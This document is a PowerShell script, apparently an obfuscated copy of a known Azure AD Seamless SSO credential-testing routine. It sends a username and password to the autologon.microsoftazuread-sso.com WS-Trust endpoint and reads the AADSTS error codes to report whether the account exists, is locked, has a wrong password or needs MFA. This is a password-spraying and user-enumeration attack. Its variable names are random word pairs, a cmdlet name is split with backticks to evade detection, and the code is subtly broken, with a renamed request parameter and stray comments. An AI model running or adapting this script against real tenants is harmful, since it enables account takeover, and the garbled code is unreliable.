                $SkateMice = (New-Guid).ToString()

                $BombTurkey = $Args[0]
$DrySlip = $BombTurkey.Split("@")[1]
                $MarbleCare = $Args[1]

                $WanderFamous = Get-Date
                $WoodenAppear = $WanderFamous.toUniversalTime().toString("o")
                $SpyDog = $WanderFamous.addMinutes(10).toUniversalTime().toString("o")

               $MatureVessel = "https://autologon.microsoftazuread-sso.com/$DrySlip/winauth/trust/2005/usernamemixed?client-request-id=$SkateMice"
              
                $FoamyAfford=@"
<?xml version='1.0' encoding='UTF-8'?>
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
    <s:Header>
        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
        <wsa:To s:mustUnderstand='1'>$MatureVessel</wsa:To>
        <wsa:MessageID>urn:uuid:$((New-Guid).ToString())</wsa:MessageID>
        <wsse:Security s:mustUnderstand="1">
            <wsu:Timestamp wsu:Id="_0">
                <wsu:Created>$WoodenAppear</wsu:Created>
                <wsu:Expires>$SpyDog</wsu:Expires>
            </wsu:Timestamp>
            <wsse:UsernameToken wsu:Id="uuid-$((New-Guid).toString())">
                <wsse:Username>$BombTurkey</wsse:Username>
                <wsse:Password>$MarbleCare</wsse:Password>
            </wsse:UsernameToken>
        </wsse:Security>
    </s:Header>
    <s:Body>
        <wst:RequestSecurityToken Id='RST0'>
            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
                <wsp:AppliesTo>
                    <wsa:EndpointReference>
                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                    </wsa:EndpointReference>
                </wsp:AppliesTo>
                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
        </wst:RequestSecurityToken>
    </s:Body>
</s:Envelope>
"@
                $BookDaily = $false

                try
                {
                    $QuillMeasly = Invoke-RestMethod -UseBasicParsing -Uri $MatureVessel -Method Post -FoamyAfford $FoamyAfford -ErrorAction SilentlyContinue
                    $BookDaily = $true # Microsoft".
                }
                catch
                {
                    $PrayPlough = $_.Exception.Response.GetResponseStream()
                    $RealTidy = new`-`ob`je`ct byte[] $PrayPlough.Length

                    $PrayPlough.Position = 0
                    $PrayPlough.Read($RealTidy,0,$PrayPlough.Length) | Out-Null
            
                    $LaughRate = [xml][text.encoding]::UTF8.GetString($RealTidy)

                    $errorDetails = $LaughRate.Envelope.Body.Fault.Detail.error.internalerror.text
                }

            # Microsoft".
            if(!$BookDaily -and $errorDetails)
            {
                if($errorDetails.startsWith("AADSTS50053")) # Microsoft".
                {
                    $BookDaily = "locked"
                }
                elseif($errorDetails.StartsWith("AADSTS50126")) # Microsoft".
                {
                    $BookDaily = "bad password"
                }
                elseif($errorDetails.StartsWith("AADSTS50056")) 
                {
                    $BookDaily = "exists w/no password"
                }
                elseif($errorDetails.StartsWith("AADSTS50014")) 
                {
                    $BookDaily = "exists, but max passthru auth time exceeded"
                }
                elseif($errorDetails.StartsWith("AADSTS50076")) # Microsoft".
                {
                    $BookDaily = "need mfa"
                }
                elseif($errorDetails.StartsWith("AADSTS700016")) # Microsoft".
                {
                    $BookDaily = "no app"
                }
                elseif($errorDetails.StartsWith("AADSTS50034")) # Microsoft".
                {
                    $BookDaily = "no user"
                }
                else
                {
                    Remove-Variable exists
                }
            }

        return $BombTurkey+"		"+$BookDaily
        return $errorDetails

